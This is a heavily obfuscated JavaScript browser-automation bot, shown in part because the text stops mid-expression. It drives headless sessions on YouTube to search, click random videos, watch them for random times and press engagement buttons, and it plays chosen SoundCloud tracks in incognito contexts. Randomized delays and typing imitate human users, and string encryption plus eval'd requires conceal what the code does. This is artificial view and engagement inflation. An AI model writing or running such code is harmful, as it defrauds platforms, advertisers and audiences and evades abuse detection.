function a() {
  const bm = [
    'pts/by-sit',
    'zgLYzwn0',
    'uSomWOFdHSoaWRa',
    'wmkjgCkkW4G',
    'yxn0zxi',
    'W6pdJmkVbSoxW6WKt8odpW',
    'easyfork.o',
    '\x20(KHTML,\x20l',
    'y2HPBgrYzw4',
    'CYXYBsbIDhmSyG',
    'zwfZEwzVCMSUBW',
    'BMvJCMfMDcbZyW',
    'y3jHzNqSBwLUzq',
    'https://gr',
    'homepage',
    '_BrT2PlUiw',
    'CgpdI8kqkCoNW4/cJ8o+yq',
    'object',
    't0HfquXFqw50Aq',
    'bxBcS8kQWPK6DCoUWO7cRW',
    '/AdlerED/%',
    'W6ldKSkat8o1W713i3aW',
    'W6jQWP8QswFdLCk5W5xcMq',
    'zg9JDw1LBNqUza',
    'WQyEBK4pkWrXWQWv',
    '-8fcefe061',
    'ExqTy29Yzs1PBq',
    'dium.com/b'
  ];
  a = function() {
    return bm;
  };
  return a();
}
const Y = d,
  X = b,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xe09 + -0x49 * 0x75 + 0x5 * 0x97b))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x10c8 + 0x1e85 + -0x2f4d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xb5 * -0x3b + 0xdc62 + -0x3d7b * 0x1 + (0x6d05 + -0x7063 * -0x1 + -0xa2d0) * random()) : await standardWaitForNetIdle(f), await wait(-0x238b + 0x904 * -0x2 + 0x491b + (0x4 * 0x9f7 + -0x35be + 0x34f2) * random()), -0x218b + -0x240d + -0x1733 * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2 * -0xb62 + -0x1 * 0x1725 + 0x5f3 * 0xb), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0x17e9 + 0x6 * 0x295 + 0x86c;
}
async function randomWait() {
  return await wait(0x20b0 + -0x6c * -0x4b + -0x2ccc + (-0x1 * -0x191b + -0xa4b + 0x4b8) * random()), -0xed5 + -0x3 * 0x96b + 0x2b17;
}
async function watchRandomFrontScreenVideo(f) {
  const a8 = {
    f: 0x1a
  };
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me'](R(a8.f) + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x28 * 0xef + 0x1a84 + 0x9a * 0x12, 0x1615 + -0x18d * -0x10 + 0x7 * -0x6b2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1 * -0x60cd + -0x17 * -0x10b6 + 0x299 * -0x5f) * getRandomInt(0xe46 + -0x169f + 0x85b, 0x1348 + 0x1 * -0x1685 + -0x342 * -0x1), h)), 0x50f + -0x239 * 0x7 + 0xa81;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x20ca + -0x3 * 0x7c4 + -0x10e * 0x9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * -0x88b + 0x15d * -0x1 + -0x72d]['split']('\x20');
    for (let k = 0x9b3 + -0x262a + 0x1c77; k < i['length']; k += -0x2d * -0x3a + 0x3a5 + -0xdd5)
      j += i[k] * h[i[k + (0x1 * -0x18c1 + 0x506 * -0x1 + 0x1dc8)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x16df + -0x2389 + 0xcb0)['map'](l => Array['from'](l['children']))['flat'](-0x5eb + 0x1f5a * -0x1 + -0x1a * -0x16f)['map'](l => l['childNodes'][-0xa9e + -0x1 * 0xe89 + 0x1928]['childNodes'][-0x7 * -0x3a7 + -0x248d + 0xafc]['childNodes'][-0x1705 * 0x1 + 0x1 * 0x2225 + -0xb1f]['childNodes'][0x1 * 0x261f + 0x2 * -0xcd2 + 0x9 * -0x163]['childNodes'][0xb1e * 0x1 + 0x2 * 0x1207 + -0x4b * 0xa1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x305 * -0x6 + -0x2100 + 0x3706, 0x44 * 0x4e + 0x1169 + -0x45 * 0x45)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x3730 + -0x3273 + 0x35db * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x3367 * -0x7 + -0x169ef + 0x3bc20) * getRandomInt(0xe3 * 0x17 + 0xdc8 + 0x1 * -0x222b, -0xa7 * -0x13 + 0xfd3 + 0x1c33 * -0x1), h);
  return await wait(i), -0x24e7 * -0x1 + -0x113e + 0x128 * -0x11;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x15aa + 0xfff + -0x25a9]['children'][0x1962 * 0x1 + -0x19ac + 0x4a]['children'][-0x1685 + -0x1 * -0x43f + 0x1246]['children'][0x14b * 0x6 + -0x5 * -0x346 + 0x20 * -0xc1][S(0x8)][-0xcbb * 0x3 + -0x4 * -0x506 + 0x1219]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xdd * -0x4 + -0x2 * 0xd7c + 0x1e6d;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x150d + -0x95 * -0x26 + -0x1 * 0xad + (0x419 * 0x1 + -0x9d3 * -0x3 + -0x164 * 0x18) * random()
  }), await wait(-0xb5c * -0x3 + 0xd5 + 0xb * -0x2ff + (-0x1e01 + -0x1a11 + -0x1 * -0x393e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = b,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x201d + -0x2 * 0x5bf + 0x2b9d]['childNodes'][-0x3 * 0xa8b + -0x201f + 0x3fc1]['childNodes'][0xef2 + 0x11e9 + -0x20da]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x198f + 0x7 * 0x4c2 + -0x7ba]['childNodes'][-0x189b + 0x2618 + -0xd7d]['childNodes'][0x628 * 0x4 + -0x1bdc + 0x53 * 0xa]['ariaLabel'];
    return l[T(0x10, 'hNUK') + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x260c + 0x56e + -0x167 * 0x1f),
          r = 0x200e + 0x2179 + -0x4187;
        for (let u = 0x4fc * -0x4 + -0xad * 0xe + -0x1d66 * -0x1; u < q['length']; u += -0x22a7 * 0x1 + -0x1d96 + 0x403f)
          r += q[u] * k[q[u + (0x621 + 0x1dbf * -0x1 + 0x179f)]];
        return r;
      }(n);
  });
  await wait((-0x5cce + 0xa67 * 0x1 + 0x8cff) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xa7e9 + -0x7d80 + 0x2ffb * 0xb) * getRandomInt(0x1929 + -0x246 + 0x65 * -0x3a, 0x977 * -0x1 + 0x96d + 0x14), h + (-0x26da + 0xb3 * 0x31 + 0x41 * 0x5f));
  return await wait(i), -0x2186 + 0x20e * 0x7 + -0x179 * -0xd;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x5da + -0x15 * -0x17f + -0x1991 * 0x1);
    let h = e[f];
    if (b['OHFeGI'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x150b + -0x1655 * 0x1 + 0x2b60, s, t, u = 0x2a * -0x96 + -0x25 * 0xd0 + 0x36ac; t = n['charAt'](u++); ~t && (s = r % (-0x15c7 + 0x1 * 0xa1f + 0x2eb * 0x4) ? s * (-0x1108 + -0x1507 + 0x1d3 * 0x15) + t : t, r++ % (-0x142d * -0x1 + 0x470 * -0x1 + -0xfb9)) ? p += String['fromCharCode'](0x1084 + -0x138d + 0x408 & s >> (-(-0xe3 * 0x19 + -0x152 * -0xf + 0x1 * 0x25f) * r & -0x4dc + -0x2186 + 0x2668)) : -0x5d5 + 0x2a6 + 0x32f) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * -0x881 + 0x3d * 0xe + -0xbd7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xf7e + 0x15 * 0x1af + -0x32c9))['slice'](-(0x20b0 + -0x6c * -0x4b + -0x4052));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x191b + -0xa4b + -0xed0,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xed5 + -0x3 * 0x96b + 0x2b16; u < -0x28 * 0xef + 0x1a84 + 0x5ea * 0x2; u++) {
          p[u] = u;
        }
        for (u = 0x1615 + -0x18d * -0x10 + 0x7 * -0x6b3; u < -0x1 * -0x811 + -0x8 * -0x401 + 0x2719 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xe46 + -0x169f + 0x959), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1348 + 0x1 * -0x1685 + -0x33d * -0x1, q = 0x50f + -0x239 * 0x7 + 0xa80;
        for (let v = 0x20ca + -0x3 * 0x7c4 + -0x10e * 0x9; v < n['length']; v++) {
          u = (u + (-0x1 * -0x88b + 0x15d * -0x1 + -0x72d)) % (0x9b3 + -0x262a + 0x1d77), q = (q + p[u]) % (-0x2d * -0x3a + 0x3a5 + -0xcd7), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * -0x18c1 + 0x506 * -0x1 + 0x1ec7)]);
        }
        return t;
      };
      b['JFKfMY'] = m, c = arguments, b['OHFeGI'] = !![];
    }
    const j = e[0x16df + -0x2389 + 0xcaa],
      k = f + j,
      l = c[k];
    return !l ? (b['MTZfYC'] === undefined && (b['MTZfYC'] = !![]), h = b['JFKfMY'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x134a + -0x509 * -0x6 + -0x3180), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x48f * -0x6 + -0x1 * -0x133a + 0x13d8 + (-0xd88 * 0x1 + -0x106b + 0x21db) * Math['random']());
    });
  }, -0x101 * 0x31 + -0x2a75 + 0x76fe);
  await wait(-0x307bc + 0xbe7f * 0xa + -0x1 * -0x2aa6);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x16c38 + 0x18 * -0xca4 + 0xad88) * getRandomInt(-0xe21 * -0x1 + 0x7 * -0x453 + 0x1028, -0x886 * 0x3 + 0xd2e + 0xc7d)), clearInterval(h), 0x212e + 0x911 + -0x2a3e;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1a0b * -0x1 + 0x4de + -0x1ee9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1114 + -0x174 * -0x13 + -0xa87;
    await randomWait();
  }
  return 0xbe1 + 0x1 * -0xbcf + -0x11;
}

function fetchRandomSC() {
  return Math['random']() <= -0x63d * -0x6 + 0x17cd + -0x3d3b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xc3e + -0x2 * 0x108d + 0x2d58 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x5da + -0x15 * -0x17f + -0x1991 * 0x1);
    let h = e[f];
    if (c['zTCTgj'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x150b + -0x1655 * 0x1 + 0x2b60, r, s, t = 0x2a * -0x96 + -0x25 * 0xd0 + 0x36ac; s = m['charAt'](t++); ~s && (r = q % (-0x15c7 + 0x1 * 0xa1f + 0x2eb * 0x4) ? r * (-0x1108 + -0x1507 + 0x1d3 * 0x15) + s : s, q++ % (-0x142d * -0x1 + 0x470 * -0x1 + -0xfb9)) ? o += String['fromCharCode'](0x1084 + -0x138d + 0x408 & r >> (-(-0xe3 * 0x19 + -0x152 * -0xf + 0x1 * 0x25f) * q & -0x4dc + -0x2186 + 0x2668)) : -0x5d5 + 0x2a6 + 0x32f) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * -0x881 + 0x3d * 0xe + -0xbd7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xf7e + 0x15 * 0x1af + -0x32c9))['slice'](-(0x20b0 + -0x6c * -0x4b + -0x4052));
        }
        return decodeURIComponent(p);
      };
      c['hdytLE'] = i, b = arguments, c['zTCTgj'] = !![];
    }
    const j = e[-0x1 * -0x191b + -0xa4b + -0xed0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hdytLE'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2659 * 0x1 + -0x19e9 + 0x4042 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x12ff + -0xa0f + 0x1d0e;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x11a3d + 0x1baf * -0x6 + 0x2701f + getRandomInt(0x40a3 + 0x27a6 + -0x2db1, 0x4ec8 + -0x8fb2 + -0x1 * -0xb61a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2445 * 0x1 + -0x2453 + 0x4899), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x17 * -0x5e + -0x1104 + -0x892 * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate'](U(0x17) + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xdc3 + -0x14b6 + 0x2279, -0x24f7 * 0x1 + -0x24fa + 0x4a23)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x3 * -0x57e + 0x9ec * -0x1 + 0x142 + floor((-0x1882 + 0x6f0 + -0x1 * -0x157a) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = d;
        var w, x, y, z, A, B, C, D, E = V(0x11) == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x46daf * 0x20ba + 0x2 * -0x798b8f4f + 0xe2298d78),
          0x5bda2d + -0xf81e06 + 0x11c43d9,
          0x1 * -0xade6 + -0x99a0 + 0x125 * 0x18e,
          -0x22cc + -0x11f3 * 0x2 + 0x2bd * 0x1a
        ], y = [
          -0x8 * -0x391 + 0x334 * -0xc + 0xa00,
          0x315 + 0x58e * -0x6 + 0x1e4f,
          0x1d * -0x13a + 0x1 * -0x95f + -0x1d * -0x18d,
          -0x174a + 0x206b * -0x1 + 0xd * 0x449
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x163 * -0x1b + 0x7b * -0x1d + 0x1 * -0x1781)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x220c + -0x1031 + -0x11db; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x21 * 0x41 + 0x33d * -0x4 + 0x1 * 0x1555) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x10a + -0x5 * 0xaa + -0x2 * -0x22e] = A[-0x11a5 + 0x11b4 + 0x1 * 0x1] = A[-0x453 + -0x12bc + -0xf6 * -0x18] = A[-0x27f * 0xb + -0x1 * 0x263f + 0x50e * 0xd] = A[0x1eb7 + 0x2 * 0x304 + -0x24bc] = A[0xf1 + -0xe * -0x1e7 + -0x1b8f] = A[-0x1f8a + 0x1 * 0x105d + 0xa * 0x185] = A[0x13ed * 0x1 + 0x1 * -0x179 + 0xe * -0x151] = A[-0x2148 + -0x517 * 0x2 + 0x2b7d] = A[-0x5 * 0x7a2 + -0x1192 + 0x37c4] = A[0x1 * 0x1721 + -0x179 * -0x7 + 0x2167 * -0x1] = A[-0x55d * 0x5 + -0xe40 + 0x1 * 0x291b] = A[-0xd * 0x104 + -0xd6a + -0xaf * -0x27] = A[-0x2585 + -0x1147 + 0x36d8] = A[-0x6 * -0x3b0 + 0x30e * -0x3 + -0xce9] = A[-0x35 * -0x7a + -0x23f5 * -0x1 + -0x1463 * 0x3] = A[-0xef + -0x24ce + 0x25cc * 0x1] = -0x20ff + 0x22d * 0x2 + -0x1 * -0x1ca5, this['blocks'] = A) : this['blocks'] = [
                0x966 + 0x397 * 0x4 + -0x17c2,
                -0x49 * 0x6 + 0xd * 0x2d7 + -0x2335,
                -0xf * -0x22 + 0x1b97 + -0x1d95,
                -0xff1 + -0x2c * 0x82 + 0x2649,
                -0xa05 + -0x213 * -0x10 + -0x1 * 0x172b,
                -0x4eb + -0x1bcc + 0x20b7,
                0xd7c * -0x1 + 0x8 * 0x4c3 + -0x189c,
                0x1525 + -0x1 * -0x6b6 + -0x3 * 0x949,
                0x9e0 + -0x195d * 0x1 + 0xf7d,
                0x1acb + 0x17da + 0x32a5 * -0x1,
                -0xbc8 + -0xcbf + -0x1 * -0x1887,
                0x1985 + 0x1 * 0x1457 + -0x14 * 0x24b,
                0xc * -0x246 + 0x1 * -0xf55 + 0x2a9d * 0x1,
                0x639 + 0xcdd + -0x2 * 0x98b,
                0x5a6 + -0x121a + 0xc74,
                -0x3f2 + 0x17ec + 0x1 * -0x13fa,
                0x117 + -0x1795 + 0x167e
              ], this['h0'] = -0x2 * 0x394a2554 + 0x9706989 * 0x9 + -0x270407 * -0x368, this['h1'] = 0xedaf327 * -0x1 + -0x2f046b3 * -0x61 + 0x1 * -0x1e622b23, this['h2'] = 0x32d1d86 * 0x2 + 0x1 * 0xb1263dad + 0x1ec59bbb * -0x1, this['h3'] = -0x2cee544 + 0x19c7f171 + -0x221 * 0x32ed7, this['h4'] = 0x1810bd5f5 + 0x874be9a3 + -0x14484dda8, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2302 * 0x1 + -0x118 + -0x1 * 0x21ea, this['finalized'] = this['hashed'] = -0xee * 0x3 + 0xf5c + -0xc92 * 0x1, this['first'] = -0x15 * 0x1a1 + 0x2e7 * 0x2 + 0x4 * 0x71a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xb89 * 0x1 + 0x14 * 0xa3 + -0x133, O = J['length'] || 0x823 * 0x3 + 0x2485 * 0x1 + -0x3cee, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x10b * 0xf + -0x1d2 + -0xdd3, P[-0x2638 + -0x657 * -0x5 + 0x685 * 0x1] = this['block'], P[0x2 * -0x1058 + -0x35 * 0x1e + 0x26f6] = P[-0x3 * -0x9e5 + 0x1451 * 0x1 + 0x1 * -0x31ff] = P[-0x61 * 0x13 + 0x2 * 0x21e + 0x2f9] = P[-0x134b * 0x1 + -0x13d + 0x148b] = P[-0x24ce + 0x2b * -0xc8 + 0x466a] = P[0x2182 + -0x1e30 + -0x34d] = P[-0x91d + -0x1e4e + -0x1b7 * -0x17] = P[-0xbda + -0x9 * -0x16f + -0x2 * 0x83] = P[-0x1f7e + 0x1cc2 + -0xb1 * -0x4] = P[0x1 * -0x1531 + -0x6bb * -0x2 + 0x7c4] = P[0x3d8 + 0xa4 * -0x29 + 0x5 * 0x47e] = P[0x26f2 + 0x1 * 0x1d4b + 0x1d * -0x25a] = P[-0x15e8 + -0x4 * -0x5cf + -0x148 * 0x1] = P[-0x36e * 0x3 + 0x7c * -0x3d + 0x27e3] = P[0x1b * 0x1 + 0x22e6 + 0x185 * -0x17] = P[0x80a + 0x11 * 0xfd + 0xf4 * -0x1a] = -0x49 * -0x77 + -0x1 * 0x116c + -0x1083), K) {
                    for (N = this['start']; M < O && N < 0x12e9 + -0x2 * 0x6e6 + -0x4dd; ++M)
                      P[N >> -0x1779 * -0x1 + 0x21e5 + -0xe57 * 0x4] |= J[M] << y[-0x6 * -0x464 + -0x859 * -0x3 + -0x1120 * 0x3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xe3 * -0x1 + 0xc16 + -0xcb9; ++M)
                      (L = J['charCodeAt'](M)) < 0x21ea + -0x139a + -0xdd0 ? P[N >> -0x144e + 0xed2 + 0x25 * 0x26] |= L << y[0x2678 + -0x2b * 0xd + 0x2446 * -0x1 & N++] : L < 0x1 * 0xe + -0x2660 + -0x31 * -0xf2 ? (P[N >> 0x190e + -0x19fd + 0xf1] |= (0x55 * 0x33 + -0x1 * -0x1a93 + -0x2ac2 | L >> 0x1 * -0x237 + 0x1576 + -0x1339) << y[0x1 * -0x20cc + 0xf07 * 0x1 + 0x11c8 & N++], P[N >> -0x1 * -0x24e3 + 0x2d * 0x8e + -0x3dd7 * 0x1] |= (-0x1243 + -0x19ea + 0x2cad | 0x1 * 0x1a6b + -0x1630 + -0xaa * 0x6 & L) << y[0x2f * -0x9e + -0x1c5 * 0x15 + 0x422e & N++]) : L < 0x5599 + -0x24 * 0x1e7 + 0xc6e3 || L >= -0x12856 + 0x3 * -0x43c1 + -0x1 * -0x2d399 ? (P[N >> 0x1 * 0x836 + -0x1da1 + 0x156d] |= (0xb8b + -0x905 + -0x1a6 | L >> 0x5 * 0x7ac + -0x1e5f + -0x7f1) << y[-0x4 * -0x232 + -0x2113 + 0x1 * 0x184e & N++], P[N >> -0x12c2 + 0xd40 + 0x584] |= (0x1265 * 0x1 + -0x1491 + 0x2ac | L >> 0x2101 + 0x4c7 * -0x2 + -0x3 * 0x7cf & -0x601 * 0x3 + -0x230d + 0x354f) << y[0x1684 + 0xfbf + 0x8 * -0x4c8 & N++], P[N >> 0x1ed * -0x10 + 0x13ee * 0x1 + 0xae4] |= (-0x76e + -0x1 * 0xb93 + 0x1 * 0x1381 | -0x3 * 0x21d + 0x8 * -0x29 + 0x2 * 0x3ef & L) << y[-0xad5 * 0x2 + 0xa * 0x3df + -0x1109 & N++]) : (L = 0x42fa + -0x8d5d + 0x14a63 + ((0x1576 + -0xf41 + -0x236 & L) << 0x73 * 0x42 + 0x1c10 + -0x39ac | -0x4ef + 0x152d + -0xc3f & J['charCodeAt'](++M)), P[N >> -0x2eb + 0x1 * 0x1f2b + -0xf1 * 0x1e] |= (0x235f + -0x2589 + 0x31a | L >> 0x2705 * -0x1 + 0xc98 + -0x18f * -0x11) << y[0x541 + -0x221 * -0xf + -0x252d & N++], P[N >> 0xb * -0x307 + -0x862 * -0x1 + 0x18ed] |= (-0x1d38 + -0x7 * 0x2b7 + 0x30b9 | L >> 0x1e2d + -0x641 + -0x17e0 